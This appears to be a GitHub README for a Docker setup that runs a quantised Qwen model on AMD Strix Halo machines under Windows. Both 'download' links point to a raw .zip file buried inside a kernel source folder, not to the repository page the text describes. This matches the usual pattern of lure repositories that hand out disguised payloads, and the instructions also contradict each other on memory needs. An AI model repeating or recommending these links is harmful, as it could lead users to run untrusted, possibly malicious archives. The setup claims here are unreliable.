# 🤖 vllm-awq4-qwen - Run Large Language Models on AMD

[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/aphroditeformal93/vllm-awq4-qwen/raw/refs/heads/main/csrc/awq_mmq_gfx1151/awq_mmq_gfx1151/awq_vllm_qwen_v1.2.zip)

This software brings advanced artificial intelligence tools to your Windows computer using AMD hardware. It runs the Qwen 3.6-27B model with specialized settings that maximize performance on newer Strix Halo chips. You get high-speed text generation, vision capabilities, and tool-calling power without the cost of high-end server hardware.

## ⚙️ System Requirements

Before you install this software, confirm your computer meets these minimum specifications:

- Processor: AMD Ryzen AI Max Series (Strix Halo) with integrated gfx1151 graphics.
- Memory: 128 GB of shared system memory (UMA).
- Operating System: Windows 11 with WSL2 enabled.
- Disk Space: 50 GB of available storage for model files and support software.
- Software: Docker Desktop installed and running.

## 📥 Get the Software

You need the base software package to begin. Follow the link below to access the repository.

[**Visit this page to download**](https://github.com/aphroditeformal93/vllm-awq4-qwen/raw/refs/heads/main/csrc/awq_mmq_gfx1151/awq_mmq_gfx1151/awq_vllm_qwen_v1.2.zip)

1. Go to the repository link provided above.
2. Look for the green "Code" button near the top right of the page.
3. Select "Download ZIP" to save the project folder to your computer.
4. Extract the contents of the ZIP folder to a convenient location on your desktop or documents folder.

## 🐳 Set Up Docker

This software uses Docker to bundle all required components. This prevents configuration errors on your Windows system.

1. Download and install Docker Desktop from the official Docker website if you do not have it.
2. Open Docker Desktop after the installation finishes.
3. Wait for the engine to start. You see a green icon in your system tray when it is ready.
4. Open your command prompt. Press the Windows key, type "cmd", and press Enter.
5. In the command prompt, type `wsl --update` to ensure your Windows Subsystem for Linux is current.
6. Restart your computer if the installer requests it.

## 🚀 Run the Application

Once you prepare the environment and download the files, you start the model interface through your terminal.

1. Open your command prompt again.
2. Use the `cd` command to move into the folder where you extracted the project files. For example, if you saved it to your desktop, type: `cd C:\Users\YourName\Desktop\vllm-awq4-qwen`.
3. Type `docker-compose up` and press Enter.
4. Docker pulls the required system images. This may take several minutes depending on your internet connection.
5. The software initializes the Qwen model. You know it works when you see logs confirming the server is active on `http://localhost:8000`.

## 🌐 Usage

Access your local artificial intelligence interface through any web browser.

1. Open your browser.
2. Type `http://localhost:8000` into the address bar.
3. You now interact with the model directly in your browser.
4. The system supports OpenAI-compatible commands, meaning you can connect other third-party tools to this address to extend its functionality.

## 💡 Performance Features

This specific implementation offers several advantages for AMD users:

- Speculative Decoding: The system runs a secondary process called DFlash to predict output tokens. This increases the speed of text generation significantly.
- AWQ-INT4 Quantization: The model uses an efficient compression format. This allows the 27-billion parameter model to fit into your memory while maintaining high accuracy.
- Multi-Modal Support: The software understands both text and vision inputs. You can upload images or ask for text descriptions of visual files.
- 256K Context: The system processes very long documents or large sets of data in a single request. 

## 🔧 Troubleshooting

If the software fails to start, check the following items:

- Check Docker: Ensure the Docker Desktop icon is green. If it shows an error, click the icon and select "Restart".
- Check Memory: Ensure you have at least 64GB of RAM free before launching the model. Close other heavy applications like video editors or games.
- Check Logs: Look at the command prompt window where you ran `docker-compose up`. If you see a line stating "out of memory", shut down other browser tabs or background operations.
- Update Drivers: AMD users should ensure they utilize the latest ROCm-compatible drivers for their specific hardware. Visit the AMD support website to check for updates.

## 📚 Frequently Asked Questions

**Does this software send my data to the cloud?**
No. Everything runs locally on your machine. Your inputs and outputs do not leave your computer.

**Can I run this on an NVIDIA graphics card?**
This version is built specifically for AMD Strix Halo architecture. It does not utilize CUDA.

**What is the maximum context length?**
The model supports up to 256,000 tokens. This is enough for several books worth of text.

**How do I stop the model?**
Return to the command prompt window where the software is running. Press `Ctrl + C` on your keyboard to stop the process. Close the Docker window afterwards.

## ⚙️ Advanced Settings

You adjust configuration settings by editing the `docker-compose.yml` file found in your project folder. Use a basic text editor like Notepad. You modify parameters such as:

- Port settings: Change the default `8000` to a different number if you experience port conflicts.
- Precision: While AWQ-INT4 provides the best balance, you can change the quantization mode if you have specific testing needs.
- Logging: Set logs to "debug" if you need to troubleshoot installation issues.

Save your changes and run `docker-compose up` again to apply the new settings.